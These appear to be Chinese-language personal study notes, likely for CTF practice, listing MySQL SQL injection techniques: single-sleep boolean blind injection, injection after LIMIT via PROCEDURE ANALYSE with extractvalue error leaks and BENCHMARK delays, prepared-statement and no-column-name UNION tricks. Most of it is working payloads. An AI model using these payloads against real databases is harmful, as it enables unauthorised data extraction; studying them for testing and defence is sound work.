- # 布尔盲注只Sleep一次
	- 利用子查询
		- ```sql
		  # 114514<1919810是布尔盲注点
		  select * from test order by (select 1 from (select sleep(if(114514<1919810,1,0)))b);
		  # 或者
		  select * from test where (select 1 from (select sleep(if(114514<1919810,1,0)))b);
		  ```
# 使用 handler 读取 table
	- ```sql
	  handler table open;
	  handler table read first;
	  handler table close;
	  ```
- # 向 ID 参数注入
	- 大概率是整型注入, 不用加引号
# Limit 后注入
	- 这种注入也不是很常见，依照 [https://rateip.com/blog/sql-injections-in-mysql-limit-clause/](https://rateip.com/blog/sql-injections-in-mysql-limit-clause/) 来提一下
	  
	  ```
	  mysql> select * from admin where id >0 limit 0,1 $id
	  ```
	  
	  如何利用呢 大佬们已经给出方法了 用  `PROCEDURE ANALYSE`  配合报错注入,所以多看文档，如果你想提升下自己的水平
	  
	  ```
	  mysql> select * from admin where id >0 order by id limit 0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
	  ERROR 1105 (HY000): XPATH syntax error: ':5.5.53'
	  ERROR:
	  No query specified
	  ```
	  
	  这里延时只能使用 `BENCHMARK()`  如同
	  
	  ```
	  select * from admin where id >0 order by id limit 0,1 PROCEDURE analyse(extractvalue(rand(),concat(0x3a,(if(1=1,benchmark(2000000,md5(404)),1)))),1);
	  ```
- # 预处理语句
	- ```sql
	  SET @sql = concat('select * from ', 'flag');
	  PREPARE name from @sql;
	  EXECUTE name;
	  DEALLOCATE PREPARE name;
	  ```
	  
	  传参
	  
	  ```sql
	  mysql> SET @s = 'SELECT SQRT(POW(?,2) + POW(?,2)) AS hypotenuse';
	  Query OK, 0 rows affected (0.00 sec)
	  
	  mysql> PREPARE stmt2 FROM @s;
	  Query OK, 0 rows affected (0.00 sec)
	  Statement prepared
	  
	  mysql> SET @c = 6;
	  Query OK, 0 rows affected (0.00 sec)
	  
	  mysql> SET @d = 8;
	  Query OK, 0 rows affected (0.00 sec)
	  
	  mysql> EXECUTE stmt2 USING @c, @d;
	  +------------+
	  | hypotenuse |
	  +------------+
	  |         10 |
	  +------------+
	  1 row in set (0.00 sec)
	  
	  mysql> DEALLOCATE PREPARE stmt2;
	  Query OK, 0 rows affected (0.00 sec)
	  ```
# 无列名注入
	- ```sql
	  select a from (select 1 as a, 2 as b union select * from test)x limit 1 offset 1 # offset 向下偏移几行，即读取除了(1,2)之外的第几行数据
	  ```
# mysqli_real_escape_string
	- 使用 mysqli_real_escape_string 处理的 string 在插入 mysql 后会变为原样
- # 表名加引号
	- 可以在表名上使用反引号，如：
	- ```sql
	  select name from `114514`
	  ```
# 大小写敏感
	- 用`utf8mb4_0900_as_cs`
# 同时使用 insert 和 or
	- ```mysql
	  insert into test (id, name) values (2, '0' or '1');
	  ```